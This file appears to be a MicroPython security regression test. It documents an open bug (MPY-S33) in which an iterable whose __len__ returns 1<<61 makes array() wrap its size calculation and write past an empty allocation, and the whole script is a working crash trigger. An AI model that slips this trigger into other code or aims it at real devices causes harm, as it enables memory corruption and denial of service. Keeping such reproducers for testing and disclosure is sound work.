# MPY-S33 / upstream 18620, OPEN, present at the pin.
# typecode_size * len wraps: array_new allocates nothing while the logical length
# stays huge, and the fill writes through it. 1<<61 is below MP_SMALL_INT_MAX, so
# unlike MPY-S02 this one does trigger under MICROPY_LONGINT_IMPL_NONE.
# Host at the pin: SIGSEGV (rc 139).
from array import array

class Boom:
    def __len__(self):
        return 1 << 61
    def __iter__(self):
        for _ in range(4):
            yield 1.23

a = array("d", Boom())
print("S33", len(a))
